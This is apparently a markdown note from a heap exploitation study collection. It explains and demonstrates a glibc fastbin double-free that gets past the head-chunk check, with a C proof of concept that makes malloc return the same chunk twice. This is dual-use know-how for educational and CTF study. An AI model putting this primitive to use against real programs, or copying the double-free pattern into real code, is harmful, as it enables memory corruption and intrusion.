<details>
<summary><strong>Description</strong></summary>
<p>

all libc version can conduct double free in fastbin (tested on libc `2.31`, `2.35`, `2.38`, `2.39`) 

since fastbin only check the current fastbin head chunk with the chunk we're trying to free to detect double free, we just need to padding a chunk before trigger...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

void main() {
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long *chunk[9], *reallocate_chunk[4];

    for (int i = 0; i < 9; i++) chunk[i] = malloc(0x78); // request size must be in fastbin range in order to work

    for (int i = 0; i < 7; i++) free(chunk[i]); // fill the 0x80 tcache

    free(chunk[7]);
    free(chunk[8]);
    // [fastbin 0x80]: chunk8 -> chunk7

    /*VULNERABILITY*/
    free(chunk[7]);
    /*VULNERABILITY*/

    // [fastbin 0x80]: chunk7 -> chunk8 <- chunk7
    printf("now chunk[7] exists in 0x80 fastbin twice\n");

    for (int i = 0; i < 7; i++) chunk[i] = malloc(0x78); // empty the tcache

    reallocate_chunk[0] = malloc(0x78); // reallocate chunk7, trigger fastbin dumping
    // [tcache 0x80]: chunk8 -> chunk7 <- chunk8

    reallocate_chunk[1] = malloc(0x78); // reallocate chunk8
    // [tcache 0x80]: chunk7 -> chunk8 (since we dont write over chunk7 next ptr)

    reallocate_chunk[2] = malloc(0x78); // reallocate chunk7 again
    // [tcache 0x80]: chunk8

    printf("reallocate chunk 0: %p\n", reallocate_chunk[0]);
    printf("reallocate chunk 2: %p\n", reallocate_chunk[2]);

    printf("since we don't write over the next ptr for those chunks, we're able to reallocate chunk8 too\n");
    reallocate_chunk[3] = malloc(0x78); // reallocate chunk8 again

    printf("reallocate chunk 1: %p\n", reallocate_chunk[1]);
    printf("reallocate chunk 3: %p\n", reallocate_chunk[3]);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/fastbin/fastbin_double/readme.md
- https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation#double-free-table-of-content-1

</p>
</details>